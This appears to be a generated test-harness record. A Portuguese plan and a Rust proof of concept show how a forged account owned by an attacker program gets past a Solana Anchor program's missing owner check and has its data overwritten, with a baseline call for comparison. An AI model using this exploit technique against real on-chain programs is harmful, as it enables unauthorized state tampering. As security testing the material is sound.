{
  "plan": "O programa `initialize` recebe `user` como `AccountInfo` sem validar o owner e sobrescreve seus dados com a authority do signer. O baseline usa uma conta `user` legítima (dono = program_id) e um authority signer, provando que o cenário está montado. O ataque repete a mesma instrução, mas substitui `user` por uma conta forjada cujo dono é um programa atacante (owner diferente do baseline). O efeito mede que a conta forjada foi aceita e teve seus dados sobrescritos com a authority do atacante, demonstrando a falha de validação de owner.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);

// Conta user legítima: dono é o programa-alvo, dados iniciais com authority zero
let user_legit = account(
    &env.program_id,
    &anchor_account_data("User", &(Pubkey::default(),)),
    None,
);

// Conta user forjada: dono é o programa atacante, dados iniciais com authority zero
let user_forged = account(
    &attacker_program,
    &anchor_account_data("User", &(Pubkey::default(),)),
    None,
);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legítimo com a conta user correta
let ix_baseline = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(user_legit.clone(), false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (user_legit, user_legit),
    (authority, authority_account.clone()),
];
let r_base = env.baseline("initialize legitimo", &ix_baseline, &contas_baseline);

// Ataque: mesma instrução, mas com a conta user forjada (owner diferente)
let ix_attack = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(user_forged.clone(), false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (user_forged, user_forged),
    (authority, authority_account),
];
let r = env.attack("initialize com user forjado", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let dados = after(&r, &user_forged).data();
    let authority_gravada = read_pubkey(dados, 8); // 8 bytes de discriminador + Pubkey
    env.effect(
        "conta forjada aceita e sobrescrita com authority do atacante",
        authority_gravada == authority,
    );
}"
}

